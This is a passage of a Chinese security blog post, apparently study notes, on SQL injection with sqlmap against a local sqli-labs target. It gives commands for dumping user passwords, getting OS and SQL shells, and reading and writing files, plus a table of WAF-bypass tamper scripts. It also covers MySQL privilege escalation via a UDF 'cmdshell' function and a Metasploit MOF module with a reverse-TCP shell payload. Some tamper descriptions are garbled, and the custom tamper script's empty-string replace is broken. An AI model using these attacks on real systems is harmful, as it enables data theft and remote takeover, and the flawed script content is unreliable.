+<span class="ln"> 2</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --current-db
+<span class="ln"> 3</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --curent-user
+<span class="ln"> 4</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --dbs
+<span class="ln"> 5</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> -D security --tables
+<span class="ln"> 6</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> -D security -T users --columns
+<span class="ln"> 7</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> -D security -T users -C username,password --dump
+<span class="ln"> 8</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --os-shell
+<span class="ln"> 9</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --sql-shell
+<span class="ln">10</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --file-read
+<span class="ln">11</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --file-write 本地文件 --file-dest 目标目录文件
+<span class="ln">12</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span> --flush-session --tamper<span class="o">=</span>base64encode
+</code></pre></div><h3 id="内置tamper脚本">内置Tamper脚本</h3>
+<p>（这里面有些错误，以后勘正）</p>
+<p>通用：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>apostrophemask</td>
+<td>用utf8代替引号</td>
+</tr>
+<tr>
+<td>2</td>
+<td>base64encode</td>
+<td>用base64编码替换</td>
+</tr>
+<tr>
+<td>3</td>
+<td>multiplespaces</td>
+<td>围绕SQL关键字添加多个空格</td>
+</tr>
+<tr>
+<td>4</td>
+<td>space2plus</td>
+<td>用*替换空格</td>
+</tr>
+<tr>
+<td>5</td>
+<td>nonrecursivereplacement</td>
+<td>双重查询语句</td>
+</tr>
+<tr>
+<td>6</td>
+<td>space2randomblank</td>
+<td>从一个随机的空白字符可字符的有效集代替空格字符</td>
+</tr>
+<tr>
+<td>7</td>
+<td>unionalltounion</td>
+<td>替换union all select union select</td>
+</tr>
+<tr>
+<td>8</td>
+<td>securesphere</td>
+<td>追加特定的字符串</td>
+</tr>
+</tbody>
+</table>
+<p>MSSQL：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>space2hash</td>
+<td>让过过滤替换空格字符，后跟一个破折号注释，一个随机字符串和一个新行</td>
+</tr>
+<tr>
+<td>2</td>
+<td>equaltolike</td>
+<td>like替代等号</td>
+</tr>
+<tr>
+<td>3</td>
+<td>space2mssqlblank</td>
+<td>空格替换为其他空符号</td>
+</tr>
+<tr>
+<td>4</td>
+<td>space2mssqlhash</td>
+<td>替换空格</td>
+</tr>
+<tr>
+<td>5</td>
+<td>between</td>
+<td>用between替换大于号&gt;</td>
+</tr>
+<tr>
+<td>6</td>
+<td>percentage</td>
+<td>asp允许每一个字符前面添加一个%</td>
+</tr>
+<tr>
+<td>7</td>
+<td>sp_password</td>
+<td>追加sp_password从DBMS日志的自动模糊处理的有效荷载的末尾</td>
+</tr>
+<tr>
+<td>8</td>
+<td>charencode</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>9</td>
+<td>randomcase</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>10</td>
+<td>charunicodeencode</td>
+<td>字符串unicode编码</td>
+</tr>
+<tr>
+<td>11</td>
+<td>space2comment</td>
+<td>用注释/**/替换空格</td>
+</tr>
+</tbody>
+</table>
+<p>MySQL：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>equaltolike</td>
+<td>like代替等号</td>
+</tr>
+<tr>
+<td>2</td>
+<td>greatest</td>
+<td>绕过过滤&gt;，用greatest代替大于号</td>
+</tr>
+<tr>
+<td>3</td>
+<td>apostrophenullencode</td>
+<td>绕过过滤双引号，替换字符和双引号</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ifnull2ifisnull</td>
+<td>绕过对ifnull过滤，替换类似if null(a,b)为if(isnull(a),b,a)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>space2mssqlhash</td>
+<td>替换空格</td>
+</tr>
+<tr>
+<td>6</td>
+<td>modsecurityversioned</td>
+<td>过滤空格，包含完整的查询版本注释</td>
+</tr>
+<tr>
+<td>7</td>
+<td>space2mysqlblank</td>
+<td>空格替换其他空白符号（mysql）</td>
+</tr>
+<tr>
+<td>8</td>
+<td>between</td>
+<td>用between代替大于号&gt;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>modsecurityzeroversioned</td>
+<td>包含完整的查询与零版本注释</td>
+</tr>
+<tr>
+<td>10</td>
+<td>space2mysqldash</td>
+<td>替换空格字符，~后跟一个破折号注释一个新行</td>
+</tr>
+<tr>
+<td>11</td>
+<td>bluecoat</td>
+<td>代替空格字符后与一个有效的随机空白字符的sql语句，然后替换=为like</td>
+</tr>
+<tr>
+<td>12</td>
+<td>percentage</td>
+<td>每一个字符前面添加一个%号</td>
+</tr>
+<tr>
+<td>13</td>
+<td>charencode</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>14</td>
+<td>randomcase</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>15</td>
+<td>versionedkeywords</td>
+<td>对每一个不是函数的关键字用Mysql注释包裹</td>
+</tr>
+<tr>
+<td>16</td>
+<td>space2comment</td>
+<td>用注释/**/代替空格</td>
+</tr>
+<tr>
+<td>17</td>
+<td>charunicodeencode</td>
+<td>字符串unicode编码</td>
+</tr>
+<tr>
+<td>18</td>
+<td>versionedmorekeywords</td>
+<td>注释绕过</td>
+</tr>
+<tr>
+<td>19</td>
+<td>halfversionedmorekeywords</td>
+<td>关键字前加注释</td>
+</tr>
+<tr>
+<td>20</td>
+<td>halfversionedmorekeywords</td>
+<td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本注释</td>
+</tr>
+<tr>
+<td>21</td>
+<td>space2morehash</td>
+<td>空格替换为#，以及更多随机字符串，换行符</td>
+</tr>
+</tbody>
+</table>
+<p>Oracle：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>greatest</td>
+<td>绕过过滤&gt;，用greatest代替大于号</td>
+</tr>
+<tr>
+<td>2</td>
+<td>apostrophenullencode</td>
+<td>绕过过滤双引号，替换字符和双引号</td>
+</tr>
+<tr>
+<td>3</td>
+<td>between</td>
+<td>用between代替大于号&gt;</td>
+</tr>
+<tr>
+<td>4</td>
+<td>charencode</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>5</td>
+<td>randomcase</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>6</td>
+<td>charunicodeencode</td>
+<td>字符串unicode编码</td>
+</tr>
+<tr>
+<td>7</td>
+<td>space2comment</td>
+<td>用注释/**/代替空格</td>
+</tr>
+</tbody>
+</table>
+<p>PostgreSQL：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>greatest</td>
+<td>绕过过滤&gt;，用greatest代替大于号</td>
+</tr>
+<tr>
+<td>2</td>
+<td>apostrophenullencode</td>
+<td>绕过过滤双引号，替换字符和双引号</td>
+</tr>
+<tr>
+<td>3</td>
+<td>between</td>
+<td>用between代替大于号&gt;</td>
+</tr>
+<tr>
+<td>4</td>
+<td>charencode</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>5</td>
+<td>randomcase</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>6</td>
+<td>charunicodeencode</td>
+<td>字符串unicode编码</td>
+</tr>
+<tr>
+<td>7</td>
+<td>space2comment</td>
+<td>用注释/**/代替空格</td>
+</tr>
+<tr>
+<td>8</td>
+<td>percentage</td>
+<td>每一个字符前面添加一个%号</td>
+</tr>
+</tbody>
+</table>
+<p>Access：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>appendnullbyte</td>
+<td>在有效负荷结束位置加载零字节字符编码</td>
+</tr>
+</tbody>
+</table>
+<p>Other：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>chardoubleencode</td>
+<td>双url编码（已编码不处理）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>unmagicquotes</td>
+<td>宽字符绕过GPCaddslashes</td>
+</tr>
+<tr>
+<td>3</td>
+<td>randomcomments</td>
+<td>用/**/分割sql关键字</td>
+</tr>
+</tbody>
+</table>
+<h3 id="tamper脚本编写">Tamper脚本编写</h3>
+<p>base64encode.py的解读，可见关键的地方只在对payload参数的处理。</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="c1">#头部声明</span>
+<span class="ln"> 2</span><span class="c1">#!/usr/bin/env python</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="s2">&#34;&#34;&#34;
+</span><span class="ln"> 5</span><span class="s2">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
+</span><span class="ln"> 6</span><span class="s2">See the file &#39;LICENSE&#39; for copying permission
+</span><span class="ln"> 7</span><span class="s2">&#34;&#34;&#34;</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="c1">#sqlmap内部调用</span>
+<span class="ln">10</span><span class="kn">from</span> <span class="nn">lib.core.convert</span> <span class="kn">import</span> <span class="n">encodeBase64</span>
+<span class="ln">11</span><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
+<span class="ln">14</span>
+<span class="ln">15</span><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+<span class="ln">16</span>    <span class="k">pass</span>
+<span class="ln">17</span>
+<span class="ln">18</span><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+<span class="ln">19</span>    <span class="s2">&#34;&#34;&#34;
+</span><span class="ln">20</span><span class="s2">    Base64-encodes all characters in a given payload
+</span><span class="ln">21</span><span class="s2">
+</span><span class="ln">22</span><span class="s2">    &gt;&gt;&gt; tamper(&#34;1&#39; AND SLEEP(5)#&#34;)
+</span><span class="ln">23</span><span class="s2">    &#39;MScgQU5EIFNMRUVQKDUpIw==&#39;
+</span><span class="ln">24</span><span class="s2">    &#34;&#34;&#34;</span>
+<span class="ln">25</span>
+<span class="ln">26</span>    <span class="k">return</span> <span class="n">encodeBase64</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">binary</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="k">if</span> <span class="n">payload</span> <span class="k">else</span> <span class="n">payload</span>
+<span class="ln">27</span>
+</code></pre></div><p>当WAF过滤空格，union select关键字时，可以这样编写脚本：（sqlmap会主动闭合sql语句，不需要担心注释符的过滤如#,-,+,/,*。所以对注释符的过滤可以不用处理。）</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln">1</span><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+<span class="ln">2</span>    <span class="s2">&#34;&#34;&#34;
+</span><span class="ln">3</span><span class="s2">    Bypass sqli-labs/Less-28
+</span><span class="ln">4</span><span class="s2">    &#34;&#34;&#34;</span>
+<span class="ln">5</span>
+<span class="ln">6</span>	<span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+<span class="ln">7</span>		<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;union select&#39;</span><span class="p">,</span><span class="s1">&#39;union all select&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;%0a&#39;</span><span class="p">)</span>
+<span class="ln">8</span>    	<span class="k">return</span> <span class="n">payload</span>
+</code></pre></div><h2 id="提权">提权</h2>
+<p>mysql提权一般在root权限下，而linux有个专门的mysql账号一般不是root权限。mysql连接文件一般为conn.php，config.php，common.inc.php</p>
+<h3 id="密码破解获取">密码破解获取</h3>
+<ul>
+<li>
+<p>数据库查询（加了密的）</p>
+</li>
+<li>
+<p>配置文件读取</p>
+</li>
+<li>
+<p>下载user文件</p>
+<p>user文件在mysql的dta目录下</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="k">select</span> <span class="o">@@</span><span class="n">basedir</span>
+<span class="ln">2</span>  
+<span class="ln">3</span><span class="c1">#version&gt;5.1
+</span><span class="ln">4</span><span class="c1"></span><span class="k">select</span> <span class="o">@@</span><span class="n">plugin_dir</span>
+</code></pre></div></li>
+</ul>
+<h3 id="udf用户定义函数提权">Udf（用户定义函数）提权</h3>
+<p>假如恶意用户可以导入文件，可以创建这么一个文件执行命令 C:\windows\udf.dll：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="c1">#利用导入的dll创建函数，执行命令，最后删除
+</span><span class="ln">2</span><span class="c1"></span><span class="k">Create</span> <span class="n">Function</span> <span class="n">cmdshell</span> <span class="n">returns</span> <span class="n">string</span> <span class="k">soname</span> <span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span>
+<span class="ln">3</span><span class="k">select</span> <span class="nf">cmdshell</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
+<span class="ln">4</span><span class="k">drop</span> <span class="n">function</span> <span class="n">cmdshell</span>
+</code></pre></div><h3 id="mof托管对象格式提权">Mof（托管对象格式）提权</h3>
+<p>这个是windows下的东西。通过root权限下，导入这里c:\windows\system32\webm\mof，这样会定时执行。其他的数据库也可以这么提权。</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>use exploit/windows/mysql/mysql_mof
+<span class="ln">2</span>set password xxx
+<span class="ln">3</span>set username xxx
+<span class="ln">4</span>set rhost xxx
+<span class="ln">5</span>set rport xxx
+<span class="ln">6</span>set payload windows/shell_reverse_tcp
+<span class="ln">7</span>set lhost xxx
+<span class="ln">8</span>set lport xxx
+<span class="ln">9</span>exploit
+</code></pre></div></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/tech/authorization/">SRC之越权漏洞案例
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/tech/sql-3/">Oracle数据库注入
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/bin/subarashikihibi-1/">素晴日剧本片段
+</a></li><li><a href="/posts/tech/gal-extract/">记第一次从gal中解包提取素材和剧本
+</a></li><li><a href="/bin/free-talk/">杂谈——阿西莫夫的小说&amp;简奥斯汀所处的时代&amp;1984
+</a></li><li><a href="/posts/others/lighting-ball/">《球状闪电》
+</a></li><li><a href="/posts/others/stolz/">Stolz定理和一道例题
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile4.jpg" alt="リソウナジダイ" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">リソウナジダイ</h5><div class="profile-bio mb-2">バカです　何度もバカだって言ってるじゃないですか</div><div class="profile-company mb-2"><i class="fas fa-fw fa-building"></i>挣钱只为抽老婆</div><div class="profile-about mb-2"><i class="fas fa-fw fa-info-circle"></i><a  href="/about/">关于</a></div>
+      </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/intranet-3/">Socket代理
+</a></li><li><a href="/posts/tech/intranet-2/">内网文件传输
+</a></li><li><a href="/posts/tech/shell/">反弹shell
+</a></li><li><a href="/posts/tech/linux/">Linux主机信息收集
+</a></li><li><a href="/posts/tech/windows-2/">域内凭据获取
+</a></li><li><a href="/posts/tech/intranet/">Windows内网信息收集
+</a></li><li><a href="/posts/tech/windows/">Windows密码凭证获取
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="打怪升级">
+          打怪升级 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a><a href="/categories/%E8%AF%AD%E8%A8%80%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="语言类">
+          语言类 <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">10</span>
+        </a><a href="/series/%E4%B9%A6%E7%B1%8D%E7%89%87%E6%AE%B5/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="书籍片段">
+          书籍片段 <span class="badge rounded-pill">6</span>
+        </a></div>
+    </section><section class="taxonomy-tags row surface">
+      <h4>
+        <a href="/tags">标签</a>
+      </h4>
+      <div><a href="/tags/kalafina/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="kalafina">
+          kalafina <span class="badge rounded-pill">5</span>
+        </a><a href="/tags/%E7%99%BD%E8%89%B2%E7%9B%B8%E7%B0%BF2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="白色相簿2">
+          白色相簿2 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%A7%BD%E7%BF%BC%E7%9A%84%E5%B0%A4%E6%96%AF%E7%BC%87%E4%BA%9A/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="秽翼的尤斯缇亚">
+          秽翼的尤斯缇亚 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%B0%8F%E5%9C%86/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="魔法少女小圆">
+          魔法少女小圆 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="百年孤独">
+          百年孤独 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E7%A9%BA%E4%B9%8B%E5%A2%83%E7%95%8C/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="空之境界">
+          空之境界 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E8%8B%B1%E5%9B%BD%E5%8F%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="英国史">
+          英国史 <span class="badge rounded-pill">2</span>
+        </a><a href="/tags/fate/zero/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="fate/zero">
+          fate/zero <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/magisk/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="magisk">
+          magisk <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%8F%8D%E5%8F%9B%E7%9A%84%E9%B2%81%E8%B7%AF%E4%BF%AE/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="反叛的鲁路修">
+          反叛的鲁路修 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%B0%91%E5%A5%B3%E7%90%86%E8%AE%BA%E5%8F%8A%E5%85%B6%E5%91%A8%E8%BE%B9/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="少女理论及其周边">
+          少女理论及其周边 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E6%96%A9%E8%B5%A4%E7%B4%85%E4%B9%8B%E7%9E%B3/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="斩·赤紅之瞳！">
+          斩·赤紅之瞳！ <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2023 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
